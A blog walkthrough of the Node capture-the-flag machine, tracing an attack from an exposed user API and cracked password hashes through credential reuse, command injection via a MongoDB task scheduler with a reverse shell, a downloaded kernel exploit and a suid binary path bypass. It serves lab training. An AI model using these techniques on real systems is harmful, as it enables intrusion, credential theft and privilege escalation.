+++
title = "Node CTF walkthrough"
date = 2020-07-31T10:32:16+01:00
draft = false
description = "A walkthrough of the VulnHub and Hackthebox CTF Node"
slug = "" 
tags = []
categories = []
externalLink = ""
series = []
+++

[Node](https://www.vulnhub.com/entry/node-1,252/) was a machine on Hackthebox a few years ago and was later put up on Vulnhub. I've only recently got around to doing it, but it was really rather interesting with its full-stack Javascript environment, something that is becoming increasingly common with the likes of NodeJS, and I found it quite enjoyable. In my opinion, it's one of the more fun boxes on Hackthebox, and I encourage you to give it a go if you haven't already.

![Node logo](/img/node/logo.png)

# Enumeration and foothold
As always I started out with `nmap -sC -sV 192.168.123.133`, and owing to the theme of the box, my suspicions were confirmed:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 10:58 BST
Nmap scan report for 192.168.123.133
Host is up (0.00043s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
MAC Address: 00:0C:29:70:8E:04 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds
```

Port 3000 is usually quite commonly used for Express, a NodeJS framework for creating web servers, although the `Apache Hadoop` puzzled me (I can only assume port 3000 is also used by such a service).  

![website screenshot](/img/node/website.png)

I tried enumerating for files and directories on the website but it got me nowhere - every time I got a status 200, followed by a redirect! However, after viewing the source code of the page it became clear there were four main emtrypoints:

```
<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
```

Reading those javascript files highlighted to me further the fact that the backend was a REST API, with endpoints such as:
* /api/users
* /api/users/latest
* /api/session/authenticate

Rather amusingly, going to `/api/users` showed me that someone really ought to think a minute or two more about security, because the JSON I got back was certainly interesting:

```
[
    {"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
    {"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
    {"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
    {"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}
]
```

Of course, it'd virtually be a crime not to try and hack the admin account (well not literally, in fact it could be the opposite, but you get what I mean), so that's exactly what I did. `hash-identifier` told me they were most likely SHA-256 hashes, and `john` was all too happy to oblige:

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchester     (?)
1g 0:00:00:00 DONE (2020-07-31 11:17) 50.00g/s 3276Kp/s 3276Kc/s 3276KC/s 123456..sabrina7
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

Logging in with username `myP14ceAdm1nAcc0uNT` and password `manchester` gave me the exciting prospect of viewing the site's source code:

![admin page screenshot](/img/node/admin.png)

This `myplace.backup` file was actually just a very very long 3.3 MB text file, and its contents suggested there was some base64 encoding going on.

```
(excerpt)
DFAAJAAgAfWMiS4Tw22u4BAAAFQ8AABgAGAAAAAAAAQAAALSBtvUlAHZhci93d3cvbXlwbGFjZS9hcHAuaHRtbFVUBQADvpWqWXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA=#
```

Naturally, I decoded the file and once again looked at what it was.

```
cat myplace.backup | base64 -d > myplace_decoded
file myplace_decoded

myplace_decoded: Zip archive data, at least v1.0 to extract
```

The zip was password-protected, but knowing the site's admin's dislike of overly-complex passwords, brute-forcing wasn't particularly difficult.

```
fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt myplace_decoded

'var/www/myplace/' is not encrypted, skipping
found file 'var/www/myplace/package-lock.json', (size cp/uc   4404/ 21264, flags 9, chk 0145)
'var/www/myplace/node_modules/' is not encrypted, skipping
'var/www/myplace/node_modules/serve-static/' is not encrypted, skipping
found file 'var/www/myplace/node_modules/serve-static/README.md', (size cp/uc   2733/  7508, flags 9, chk 1223)
found file 'var/www/myplace/node_modules/serve-static/index.js', (size cp/uc   1640/  4533, flags 9, chk b964)
found file 'var/www/myplace/node_modules/serve-static/LICENSE', (size cp/uc    697/  1189, flags 9, chk 1020)
found file 'var/www/myplace/node_modules/serve-static/HISTORY.md', (size cp/uc   2625/  8504, flags 9, chk 35bd)
found file 'var/www/myplace/node_modules/serve-static/package.json', (size cp/uc    868/  2175, flags 9, chk 0145)
'var/www/myplace/node_modules/utils-merge/' is not encrypted, skipping
found file 'var/www/myplace/node_modules/utils-merge/README.md', (size cp/uc    344/   634, flags 9, chk 9f17)
found file 'var/www/myplace/node_modules/utils-merge/index.js', (size cp/uc    219/   381, flags 9, chk 9e03)
8 file maximum reached, skipping further files


PASSWORD FOUND!!!!: pw == magicword
```

# Getting user

Now I could unzip the file and see all the source code of the Node app. `package.json` had references to `mongodb`, and so naturally I turned my attention towards getting the credentials for it, and reading the rest of the source code. I never experienced this first hand after giving up on directory enumeration a bit too quickly, but it seems the app really didn't like people doing so, and so when I kept getting status code 200's I got a humorous messgae back too.

```

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  app.use(session({
    secret: 'the boundless tendency initiates the law.',
    cookie: { maxAge: 3600000 },
    resave: false,
    saveUninitialized: false
  }));

  app.use(function (req, res, next) {
    var agent = req.headers['user-agent'];
    var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;

    if (!blacklist.test(agent)) {
      next();
    }
    else {
      count = Math.floor((Math.random() * 10000) + 1);
      randomString = '';

      var charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (var i = 0; i < count; i++)
        randomString += charset.charAt(Math.floor(Math.random() * charset.length));

      res.set('Content-Type', 'text/plain').status(200).send(
        [
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQP\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ',
          'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',
          'QQQQQQQQQQW\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',
          'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',
          'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',
          'QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ',
          'QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQQQQ',
          'QQQP\'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',
          'QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ',
          'QW jQkQ@ jWQQD\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ',
          'QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ',
          'QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ',
          'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\'<mWWWWWQW?^  ` ]6QQ\' yQQQQQ',
          'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ',
          'QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',
          'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',
          'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',
          'QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',
          'QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',
          'QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',
          'QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',
          'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',
          'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',
          'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',
          'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',
          'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',
          'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',
          '',
          '',
          '<!-- ' + randomString + ' -->'
        ].join("\n")
      );
    }
  });

  app.use(express.static(path.join(__dirname, 'static')));
  app.use(bodyParser.json());
  app.use(function(err, req, res, next) {
    if (err) {
      res.status(err.status || 500);
      res.send({
        message:"Uh oh, something went wrong!",
        error: true
      });
    }
    else {
      next();
    }
  });

  app.get('/api/users/?', function (req, res) {
    db.collection('users').find().toArray(function (error, docs) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!docs) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(docs);
      }
    });
  });

  app.get('/api/users/latest', function (req, res) {
    db.collection('users').find({ is_admin: false }).toArray(function (error, docs) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!docs) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(docs);
      }
    });
  });

  app.get('/api/users/:username', function (req, res) {
    db.collection('users').findOne({ username: req.params.username }, function (error, doc) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!doc) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(doc);
      }
    });
  });

  app.get('/api/session', function (req, res) {
    if (req.session.user) {
      res.send({
        authenticated: true,
        user: req.session.user
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.post('/api/session/authenticate', function (req, res) {
    var failureResult = {
      error: true,
      message: 'Authentication failed'
    };

    if (!req.body.username || !req.body.password) {
      res.send(failureResult);
      return;
    }

    db.collection('users').findOne({ username: req.body.username }, function (error, doc) {
      if (error) {
        res.status(500).send({
          message:"Uh oh, something went wrong!",
          error: true
        });

        return;
      }

      if (!doc) {
        res.send(failureResult);
        return;
      }

      var hash = crypto.createHash('sha256');
      var cipherText = hash.update(req.body.password).digest('hex');

      if (cipherText == doc.password) {
        req.session.user = doc;
        res.send({
          success: true
        });
      }
      else {
        res.send({
          success: false
        })
      }
    });
  });

  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.use(function(req, res, next){
    res.sendFile('app.html', { root: __dirname });
  });

  app.listen(3000, function () {
    console.log('MyPlace app listening on port 3000!')
  });

});
```

`/usr/local/bin/backup` sounded like an interesting script to look at once I got user, but that wasn't the thing that caught my eye. Rather, the MongoDB connection string highlighted possible credentials for use in SSH:

```
mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace
```

* Username: mark
* Password: 5AYRft73VtFpc84k

```

              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Aug  6 23:32:28 2018 from 10.2.1.1
mark@node:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
mark@node:~$ sudo -l
[sudo] password for mark: 
Sorry, user mark may not run sudo on node.
```

# Getting root the easy way
`uname -a` told me that I was on Linux 4.4.0, and so an easy way to get root and bypass half the CTF would have been to [use this exploit](https://www.exploit-db.com/exploits/44298). It skips half the CTF though.

```
mark@node:/tmp$ wget https://www.exploit-db.com/raw/44298 -O exploit.c
--2020-07-31 13:59:03--  https://www.exploit-db.com/raw/44298
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6021 (5.9K) [text/plain]
Saving to: ‘exploit.c’

exploit.c  100%[=============================>]   5.88K  --.-KB/s    in 0s      

2020-07-31 13:59:03 (726 MB/s) - ‘exploit.c’ saved [6021/6021]

mark@node:/tmp$ gcc exploit.c -o exploit.o;./exploit.o
task_struct = ffff8800343f0000
uidptr = ffff8800334facc4
spawning root shell
root@node:/tmp# whoami
root 
root@node:/tmp# cat /home/tom/user.txt
e1156acc3574e04b06908ecf76be91b1
root@node:/tmp# cat /root/root.txt
1722e99ca5f353b362556a62bd5e6be0
```

# Getting root the intended way

For those that wish to get root the intended way, things are a little more involved. It turned out there were two other users on the box.

```
mark@node:~$ ls -l /home
total 12
drwxr-xr-x 2 root root 4096 Aug 31  2017 frank
drwxr-xr-x 3 root root 4096 Sep  3  2017 mark
drwxr-xr-x 6 root root 4096 Sep  3  2017 tom
```

Using old passwords didn't let me login to either user, but `/etc/group` gave me a bit of a sense of direction.

```
root:x:0:
...
adm:x:4:syslog,tom
...
sudo:x:27:tom
...
tom:x:1000:
lpadmin:x:115:tom
sambashare:x:116:tom
mongodb:x:117:mongodb
mark:x:1001:
admin:x:1002:tom,root
```

Clearly Tom was the ultimate goal before admin. Strangely, Frank had no entries in `/etc/passwd`, and it was Tom's home directory which had `user.txt` - the first flag. Connecting to MongoDB and looking at the database with `mongo -u mark -p 5AYRft73VtFpc84k myplace` didn't reveal anything I didn't already know. 

`ps -aux` revealed this process however:

```
tom       1278  0.0  2.0 1008568 42540 ?       Ssl  11:45   0:01 /usr/bin/node /var/scheduler/app.js
```

Inside of /var/scheduler/ lay another Node app. Better yet I had full read access to the folder. `package.json` described the app as a "simple task scheduler", with references again to mongodb. This was the source code:

```
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

Whilst I couldn't write to this directly, I could certainly still exploit it. All the program is doing is connecting to MongoDB with the credentials we already know, except this time executing each entry in a "tasks" collection under the "scheduler" database.  Naturally all I had to do was add my own entry, and I could execute any command I wanted as Tom.

```
chomd +x /tmp/epicShell.sh
mongo -u mark -p 5AYRft73VtFpc84k scheduler
> db.tasks.insertOne({cmd: "bash /tmp/epicShell.sh"})
> db.tasks.find().pretty()
{
        "_id" : ObjectId("5f241d346bd1713496ee51c7"),
        "cmd" : "bash /tmp/epicShell.sh"
}
```

Then I got the user flag:

```
nc -lvvp 4444

Ncat: Connection from 192.168.123.133
tom@node:/$ cd ~/; cat user.txt
e1156acc3574e04b06908ecf76be91b1
```

# Exploiting a binary to get the root flag the right way

Unfortunately, not knowing Tom's password I couldn't get root just yet. But remember the `/usr/local/bin/backup` binary from earlier? Turns out it has the suid bit set, and because we're in the `admin` group we can run it. I mirrored the syntax of the first Node app we came across.

```
tom@node:/$ ls -l /usr/local/bin/backup
ls -l /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
<4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root                      
 [+] Finished! Encoded backup is below:                                                                
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

I decoded the base64, unzipped root.txt, and once again was trolled!

```
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
```

After analysing the binary however, it quickly became apparent that I could get around the code responsible for detecting the `/root` simply by cd'ing into `/` and getting rid of the `/`.

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
```

Sure enough, after I unzipped the resultant zip file with the password `magicword`, I got root.txt and finished the challenge.

```
cat root/root.txt
1722e99ca5f353b362556a62bd5e6be0
```


***You could certainly do a buffer overflow or command injection to get an actual root shell, but as this is a CTF I'll leave that as an exersise to the reader***.